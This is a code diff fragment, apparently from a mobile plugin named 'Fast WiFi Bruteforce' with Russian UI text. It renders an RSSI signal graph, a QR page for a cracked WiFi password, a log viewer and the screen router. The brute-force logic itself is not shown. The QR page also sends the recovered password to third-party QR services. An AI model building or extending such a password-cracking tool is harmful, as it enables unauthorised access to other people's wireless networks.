+                rssi_min, rssi_max, rssi_avg = -100, -30, -70
+
+            html = (
+                '<!doctype html><html><head><meta charset="utf-8">'
+                '<meta name="viewport" content="width=device-width,'
+                'initial-scale=1,user-scalable=no">'
+                '<style>'
+                'html,body{width:100%;height:100%;background:#14101c;'
+                'color:#e8dcff;font-family:sans-serif;margin:0;'
+                'overflow:hidden}'
+                'canvas{display:block;width:100%;height:100%}'
+                '.legend{position:absolute;top:12px;left:12px;'
+                'background:rgba(30,26,42,0.85);border-radius:12px;'
+                'padding:10px 14px;font-size:12px;line-height:1.6}'
+                '.legend .row{color:#a89bc4}'
+                '.legend b{color:#e8dcff}'
+                '</style></head><body>'
+                '<canvas id="c"></canvas>'
+                '<div class="legend">'
+                '<div class="row">min <b>' + str(rssi_min) + ' dBm</b></div>'
+                '<div class="row">max <b>' + str(rssi_max) + ' dBm</b></div>'
+                '<div class="row">avg <b>' + str(round(rssi_avg, 1))
+                + ' dBm</b></div>'
+                '<div class="row">n = <b>' + str(len(samples)) + '</b></div>'
+                '</div>'
+                '<script>'
+                'var P = ' + points_json + ';'
+                'var c = document.getElementById("c");'
+                'var ctx = c.getContext("2d");'
+                'var W, H;'
+                'function resize(){'
+                '  var dpr = window.devicePixelRatio || 1;'
+                '  W = window.innerWidth; H = window.innerHeight;'
+                '  if (W < 10 || H < 10) { W = 360; H = 420; }'
+                '  c.width = W * dpr; c.height = H * dpr;'
+                '  c.style.width = W + "px"; c.style.height = H + "px";'
+                '  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);'
+                '}'
+                'function draw(){'
+                '  ctx.clearRect(0, 0, W, H);'
+                '  var padL = 40, padR = 20, padT = 30, padB = 40;'
+                '  var plotW = W - padL - padR;'
+                '  var plotH = H - padT - padB;'
+                '  if (P.length === 0) { requestAnimationFrame(draw); return; }'
+                '  var maxT = 1;'
+                '  for (var i = 0; i < P.length; i++) '
+                '    if (P[i][0] > maxT) maxT = P[i][0];'
+                '  var rmin = -100, rmax = -20;'
+                '  ctx.strokeStyle = "rgba(212,180,255,0.15)";'
+                '  ctx.lineWidth = 1;'
+                '  for (var g = 0; g <= 4; g++) {'
+                '    var y = padT + plotH * g / 4;'
+                '    ctx.beginPath();'
+                '    ctx.moveTo(padL, y);'
+                '    ctx.lineTo(W - padR, y);'
+                '    ctx.stroke();'
+                '    var lvl = rmax - (rmax - rmin) * g / 4;'
+                '    ctx.fillStyle = "#a89bc4";'
+                '    ctx.font = "11px monospace";'
+                '    ctx.fillText(Math.round(lvl) + "", 6, y + 4);'
+                '  }'
+                '  ctx.beginPath();'
+                '  ctx.lineWidth = 2;'
+                '  ctx.strokeStyle = "#b088ff";'
+                '  for (var i = 0; i < P.length; i++) {'
+                '    var x = padL + plotW * (maxT > 0 ? P[i][0] / maxT : 0);'
+                '    var r = P[i][1];'
+                '    if (r < rmin) r = rmin;'
+                '    if (r > rmax) r = rmax;'
+                '    var y = padT + plotH * (rmax - r) / (rmax - rmin);'
+                '    if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);'
+                '  }'
+                '  ctx.stroke();'
+                '  ctx.fillStyle = "rgba(176,136,255,0.15)";'
+                '  ctx.beginPath();'
+                '  ctx.moveTo(padL, padT + plotH);'
+                '  for (var i = 0; i < P.length; i++) {'
+                '    var x = padL + plotW * (maxT > 0 ? P[i][0] / maxT : 0);'
+                '    var r = P[i][1];'
+                '    if (r < rmin) r = rmin;'
+                '    if (r > rmax) r = rmax;'
+                '    var y = padT + plotH * (rmax - r) / (rmax - rmin);'
+                '    ctx.lineTo(x, y);'
+                '  }'
+                '  ctx.lineTo(W - padR, padT + plotH);'
+                '  ctx.closePath();'
+                '  ctx.fill();'
+                '  ctx.fillStyle = "#8f82a8";'
+                '  ctx.font = "11px monospace";'
+                '  ctx.fillText("время (с)", W - padR - 60, H - 10);'
+                '  requestAnimationFrame(draw);'
+                '}'
+                'window.addEventListener("resize", function(){'
+                '  resize();'
+                '});'
+                'resize();'
+                'draw();'
+                '</script></body></html>'
+            )
+
+        children = [
+            ui.card([
+                ui.text("📈  RSSI ВО ВРЕМЕНИ", "labelSmall",
+                        color="secondary"),
+                ui.text(ssid, "titleMedium"),
+                ui.text("Обновление каждые 2.5 с · до {} точек".format(
+                    self.MAX_RSSI_SAMPLES), "bodySmall", color="secondary"),
+                ui.row([
+                    self._button(ui, "🗑  Очистить",
+                                 self._clear_rssi_samples,
+                                 enabled=not self._busy),
+                    self._button(ui, "↻  Обновить",
+                                 lambda: self._refresh(force=True),
+                                 style="text"),
+                ]),
+            ]),
+        ]
+
+        try:
+            children.append(ui.card([
+                ui.webview(html=html, height=520, fill_max_size=False),
+            ], padding=4))
+        except Exception as exc:
+            self._log("error", "graph webview: " + str(exc)[:200])
+            children.append(ui.card([
+                ui.text("График недоступен", "bodyMedium", color="error"),
+            ]))
+
+        children.append(self._bottom_nav(ui))
+        return children
+
+    def _clear_rssi_samples(self):
+        with self._rssi_lock:
+            self._rssi_samples = []
+        self._toast("График очищен")
+
+    def _qr_ui(self, ui):
+        if not self._found_password:
+            children = [
+                ui.button("←  На главную", self._bind(self._go, "main"),
+                          style="filled"),
+                ui.card([
+                    ui.text("🔳  QR ПАРОЛЯ", "labelSmall",
+                            color="secondary"),
+                    ui.text("Сначала нужно найти пароль", "bodyMedium",
+                            color="secondary"),
+                    self._button(ui, "🏠  К обзору", self._go, "main",
+                                 style="filled"),
+                ]),
+                self._bottom_nav(ui),
+            ]
+            return children
+
+        ssid = self._text(self._network.get("ssid", ""))
+        pw = self._found_password
+        wifi_str = "WIFI:S:{};T:WPA;P:{};;".format(ssid, pw)
+
+        try:
+            import urllib.parse
+            enc = urllib.parse.quote(wifi_str, safe="")
+        except Exception:
+            enc = wifi_str.replace(" ", "%20")
+
+        qr_primary = ("https://quickchart.io/qr?size=400&margin=2&text="
+                      + enc)
+        qr_backup = ("https://api.qrserver.com/v1/create-qr-code/"
+                     "?size=400x400&margin=20&data=" + enc)
+
+        def esc(s):
+            return (str(s).replace("&", "&amp;").replace("<", "&lt;")
+                    .replace(">", "&gt;").replace('"', "&quot;"))
+
+        html = (
+            '<!doctype html><html><head><meta charset="utf-8">'
+            '<meta name="viewport" content="width=device-width,'
+            'initial-scale=1,user-scalable=no">'
+            '<style>'
+            'html,body{background:#14101c;color:#e8dcff;margin:0;'
+            'font-family:sans-serif;display:flex;justify-content:center;'
+            'align-items:center;height:100%;flex-direction:column;'
+            'padding:16px;box-sizing:border-box}'
+            '#qrwrap{background:#fff;padding:16px;border-radius:16px;'
+            'width:min(80vw,320px);height:min(80vw,320px);'
+            'display:flex;justify-content:center;align-items:center;'
+            'box-shadow:0 8px 32px rgba(0,0,0,0.4)}'
+            '#qrwrap img{width:100%;height:100%;display:block}'
+            '#spinner{width:40px;height:40px;border-radius:50%;'
+            'border:4px solid #d4b4ff;border-top-color:transparent;'
+            'animation:spin 1s linear infinite}'
+            '@keyframes spin{to{transform:rotate(360deg)}}'
+            '.txt{margin-top:16px;font-family:monospace;font-size:11px;'
+            'color:#a89bc4;word-break:break-all;text-align:center;'
+            'max-width:90%;background:#1e1a2a;padding:10px 12px;'
+            'border-radius:10px}'
+            '</style></head><body>'
+            '<div id="qrwrap"><div id="spinner"></div></div>'
+            '<div class="txt">' + esc(wifi_str) + '</div>'
+            '<script>'
+            'var urls=["' + qr_primary + '","' + qr_backup + '"];'
+            'var idx=0;'
+            'var wrap=document.getElementById("qrwrap");'
+            'function tryNext(){'
+            '  if(idx>=urls.length){'
+            '    wrap.innerHTML="<div style=\\"color:#000;font-size:12px;'
+            'text-align:center;padding:20px\\">'
+            'QR не загрузился. Используйте текст ниже.</div>";'
+            '    return;'
+            '  }'
+            '  var img=new Image();'
+            '  img.style.width="100%";img.style.height="100%";'
+            '  img.style.display="block";'
+            '  img.onload=function(){'
+            '    wrap.innerHTML="";'
+            '    wrap.appendChild(img);'
+            '  };'
+            '  img.onerror=function(){'
+            '    idx++;'
+            '    tryNext();'
+            '  };'
+            '  img.src=urls[idx];'
+            '}'
+            'tryNext();'
+            '</script></body></html>'
+        )
+
+        children = [
+            ui.button("←  На главную", self._bind(self._go, "main"),
+                      style="filled"),
+            ui.card([
+                ui.text("🔳  QR ПАРОЛЯ", "labelSmall", color="secondary"),
+                ui.text(ssid, "titleMedium"),
+                ui.text("Отсканируйте со второго телефона — "
+                        "подключение произойдёт автоматически",
+                        "bodySmall", color="secondary"),
+            ]),
+        ]
+
+        try:
+            children.append(ui.card([
+                ui.webview(html=html, height=460, fill_max_size=False),
+            ], padding=4))
+        except Exception as exc:
+            self._log("error", "qr webview: " + str(exc)[:200])
+            children.append(ui.card([
+                ui.text("QR недоступен", "bodyMedium", color="error"),
+                ui.text(wifi_str, "bodySmall", color="muted"),
+            ]))
+
+        children.append(ui.card([
+            ui.text("💡  ЧТО ЭТО", "labelSmall", color="secondary"),
+            ui.text("Формат: WIFI:S:<SSID>;T:WPA;P:<пароль>;;",
+                    "bodySmall", color="secondary"),
+            ui.row([
+                self._button(ui, "📤  Поделиться", self._share_candidate,
+                             style="tonal"),
+                self._button(ui, "📋  Копировать WiFi-строку",
+                             self._copy_wifi_string, style="tonal"),
+            ]),
+        ]))
+
+        children.append(self._bottom_nav(ui))
+        return children
+
+    def _logs_ui(self, ui):
+        with self._log_lock:
+            logs = list(self._logs)
+
+        children = [ui.card([
+            ui.text("📋  ЖУРНАЛ", "labelSmall", color="secondary"),
+            ui.text("Команды с паролями скрыты; ответы сохранены",
+                    "bodySmall", color="secondary"),
+            ui.row([
+                self._button(ui, "💾  Экспорт", self._launch,
+                             self._export_logs, enabled=not self._busy,
+                             style="filled"),
+                self._button(ui, "🗑  Очистить", self._clear_logs,
+                             style="text"),
+            ]),
+        ])]
+
+        if not logs:
+            children.append(ui.card([
+                ui.text("Журнал пуст", "bodyMedium", color="secondary"),
+            ]))
+            children.append(self._bottom_nav(ui))
+            return children
+
+        colors = {"error": "error", "warning": "warning",
+                  "success": "success", "info": "secondary"}
+        marks = {"error": "✖", "warning": "⚠", "success": "✔", "info": "•"}
+
+        log_lines = []
+        for level, stamp, message in reversed(logs[-80:]):
+            log_lines.append(ui.text(
+                "{} {}  {}".format(marks.get(level, "•"), stamp, message),
+                "labelSmall",
+                color=colors.get(level, "secondary")))
+
+        children.append(ui.card(log_lines))
+        if len(logs) > 80:
+            children.append(ui.text(
+                "Показаны последние 80 записей.",
+                "bodySmall", color="muted"))
+
+        children.append(self._bottom_nav(ui))
+        return children
+
+    def screen_main(self, ui, api, state):
+        try:
+            self.api = api
+
+            if not self._ready:
+                return ui.scaffold(
+                    title="Fast WiFi Bruteforce",
+                    content=ui.text(self._init_error or "Плагин ещё не готов",
+                                    "bodyMedium", color="warning"))
+
+            if (not self._shell_checked_with_api
+                    or self._shell_mode == "unknown"):
+                self._shell_checked_with_api = True
+                try:
+                    self._detect_shell_mode()
+                    self._log("info",
+                              "shell mode после привязки api: "
+                              + self._shell_mode)
+                except Exception as exc:
+                    self._log("warning",
+                              "detect after api: " + str(exc)[:150])
+
+            renderers = {
+                "main": self._main_ui,
+                "networks": self._networks_ui,
+                "dicts": self._dicts_ui,
+                "browser": self._browser_ui,
+                "search": self._search_ui,
+                "graph": self._graph_ui,
+                "qr": self._qr_ui,
+                "logs": self._logs_ui,
+            }
+            renderer = renderers.get(self._page, self._main_ui)
+
+            body = []
+            body.extend(self._busy_ui(ui))
+            body.extend(renderer(ui))
+
+            if self._page in ("graph", "qr"):
+                content = ui.column(body, padding=16, spacing=10,
+                                    fill_max_size=False)
+            else:
+                content = ui.lazy_column(body, padding=16, spacing=10,
+                                         fill_max_size=True)
+
+            return ui.scaffold(
+                title="Fast WiFi Bruteforce",
+                content=content)
+
+        except Exception as exc:
+            self._log("error", "UI: " + str(exc)[:240])
+            try:
+                return ui.scaffold(
+                    title="Fast WiFi Bruteforce",
+                    content=ui.column([
+                        ui.text("Ошибка UI", "titleLarge", color="error"),
+                        ui.text(str(exc)[:300], "bodySmall", color="warning"),
+                        ui.button("🏠  На главную",
+                                  self._bind(self._go, "main"),
+                                  style="tonal"),
+                    ], padding=16, spacing=10, fill_max_size=False))
+            except Exception:
+                return ui.scaffold(title="Ошибка",
+                                   content=ui.text("UI сломан"))
